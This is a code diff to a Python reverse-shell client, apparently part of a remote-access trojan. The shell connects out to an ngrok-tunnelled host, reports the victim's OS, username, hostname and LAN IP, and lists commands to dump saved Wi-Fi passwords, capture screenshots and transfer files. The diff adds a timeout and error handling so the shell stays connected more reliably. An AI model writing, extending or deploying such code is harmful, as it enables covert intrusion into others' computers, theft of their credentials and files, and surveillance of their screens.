@@ -332,39 +332,45 @@ def reverse_shell():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(10)  # ← Timeout to prevent hanging on recv
             s.connect((NGROK_HOST, NGROK_PORT))
-            
 
             def send_data(data):
                 if not isinstance(data, bytes):
                     data = data.encode()
-                s.send(data + b"\n")
+                try:
+                    s.send(data + b"\n")
+                except:
+                    raise ConnectionError
 
             def get_system_info():
                 info = f"""
-    OS         : {platform.system()} {platform.version()}
-    Machine    : {platform.machine()}
-    Processor  : {platform.processor()}
-    Username   : {getpass.getuser()}
-    Hostname   : {socket.gethostname()}
-    IP (LAN)   : {socket.gethostbyname(socket.gethostname())}
-    RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
-    """
+OS         : {platform.system()} {platform.version()}
+Machine    : {platform.machine()}
+Processor  : {platform.processor()}
+Username   : {getpass.getuser()}
+Hostname   : {socket.gethostname()}
+IP (LAN)   : {socket.gethostbyname(socket.gethostname())}
+RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
+"""
                 return info
 
             def show_help():
                 return """Available Commands:
-        help                - Show this menu
-        info                - System info
-        wifi                - Dump saved Wi-Fi SSIDs + passwords
-        screenshot          - Capture screen & send
-        download <file>     - Download a file
-        upload <file>       - Upload a file
-        cd <dir>            - Change working directory
-        exit / quit         - Close shell"""
+    help                - Show this menu
+    info                - System info
+    wifi                - Dump saved Wi-Fi SSIDs + passwords
+    screenshot          - Capture screen & send
+    download <file>     - Download a file
+    upload <file>       - Upload a file
+    cd <dir>            - Change working directory
+    exit / quit         - Close shell"""
 
             while True:
-                cmd = s.recv(1024).decode("utf-8").strip()
+                try:
+                    cmd = s.recv(1024).decode("utf-8").strip()
+                except socket.timeout:
+                    continue  # Just try again
 
                 if not cmd:
                     continue
